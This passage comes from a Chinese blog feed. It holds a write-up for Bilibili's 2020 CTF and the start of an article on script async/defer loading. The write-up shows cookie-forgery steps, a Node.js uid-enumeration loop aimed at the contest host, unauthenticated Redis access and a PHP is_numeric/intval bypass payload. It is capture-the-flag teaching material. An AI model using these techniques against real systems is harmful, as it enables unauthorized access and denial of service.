如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 